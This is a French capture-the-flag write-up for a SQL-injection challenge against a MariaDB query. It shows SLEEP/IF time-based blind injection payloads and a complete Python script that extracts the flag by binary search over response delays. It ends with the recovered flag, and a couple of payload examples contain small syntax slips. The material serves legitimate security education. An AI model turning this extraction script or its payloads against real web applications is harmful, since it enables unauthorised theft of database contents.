# Writeup - Injection SQL #4: Quand est-ce qu'on arrive?

La requête pour ce défi est la même que pour le défi précédent. Seule la table utilisée est différente.

```sql
SELECT id,flag FROM challenge4 WHERE id='NOTRE_INPUT';
```

La différence par rapport au défi précédent est que l'on ne nous dit même pas s'il y a eu une erreur ni s'il y a des résultats. Le principe de de défi est le même que le précédent. Par contre, il faut donc trouver une manière de créer une comportement que l'on peut distinguer afin de recevoir des réponses à des questions booléennes. Une des choses qu'on peut manipuler via MariaDB est le temps que prend le serveur pour nous envoyer la réponse. En utilisant la fonction `SLEEP`, on peut artificiellement allongé le temps que le serveur prend pour nous répondre. Avant de construire notre requête et de scripter le tout, vérifions si `SLEEP` fonctionne.

```sql
 -- Entrée
' OR SLEEP(5) --
 -- Requête
 SELECT id,flag FROM challenge4 WHERE id='' OR SLEEP(5) -- ';
```

Le délai avant d'avoir une réponse est remarquablement plus long (au moins 5 secondes). Ça fonctionne!

La prochaine étape est de rendre cet appel à `SLEEP` conditionnel à une comparaison. Pour ceci, on fera appel à la fonction SQL `IF`. Son format est `SLEEP(<condition>, <si vrai>, <si faux>)`. On peut tester notre construction ainsi:

```
 -- Entrée
' IF(1>0, SLEEP(2), 0) --
 -- Requête
SELECT id,flag FROM challenge4 WHERE id='' IF(1>0, SLEEP(2), 0) -- ;

 -- Entrée
' IF(0>1, SLEEP(2), 0) --
 -- Requête
SELECT id,flag FROM challenge4 WHERE id='' IF(0>1, SLEEP(2), 0) -- ;
```

La première de ces 2 requêtes devraient prendre plus de temps alors que la deuxième prendra environ autant de temps qu'un requête vide.

Maintenant que nous pouvons avoir un comportement distinctif conditionnel à une comparaison que l'on contrôle. Il faut adapter le script que nous avons créé pour le challenge #3 afin de regarder le temps entre la requête et la réponse comme facteur plutôt que le contenu de la page.

**NOTE**: Selon la vitesse de votre connexion, la vitesse du serveur ainsi que la variation de temps entre le déla pour les réponses normales, il vous faudra mettre un `SLEEP` plus ou moins long. Faites plusieurs requêtes pour voir le temps que prend un requête sans `SLEEP` et mettez un déla suffisant pour différencier fiablement les requêtes où le `SLEEP` est exécuté de celles où il ne l'est pas.

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
from datetime import timedelta

URL = "https://unitedctf.ca:18000/challenge4.php"
HEADERS = {}
SLEEP_SECONDS = 0.3 # Sleep for 0.3 second. Adjust duration for your connection speed so you can differentiate responses.

query = "' OR IF(ASCII(SUBSTRING(flag, {}, 1)) > {}, SLEEP(" + str(SLEEP_SECONDS) + "), 0) -- " # Placeholders are for Position and ascii value respectively
validate = "' OR IF(flag='{}', SLEEP(" + str(SLEEP_SECONDS) + "), 0) -- "

def find_next_letter(index):
    resp = requests.Response()
    low = 0
    high = 0x7f # Maximum value in ASCII range

    # Use binary search over the ASCII range. Faster than enumerating each character
    while high > low:
        char = (low + high) // 2
        try:
            resp = requests.post(URL, data={"flagID": query.format(index, char)}, headers=HEADERS)
        except ConnectionError as e:
            print(e)
        if resp.elapsed > timedelta(seconds=SLEEP_SECONDS):
            low = char + 1
        else:
            high = char
    return chr(low)

def find_password():
    currentPass = ""
    while requests.post(URL, data={"flagID": validate.format(currentPass)}, headers=HEADERS).elapsed < timedelta(seconds=SLEEP_SECONDS):
        currentPass += find_next_letter(len(currentPass) + 1) #SUBSTRING is 1-indexed
        print(currentPass)
    return currentPass

print("Flag: " + find_password())
```

After some time, we get the flag:

Flag: **FLAG-=+.I.U{7V$?rl!/p_Three_Tables_for_the_Elven-admins_under_the_RDBMS_f2@1_.V)qu_!;:{P,**
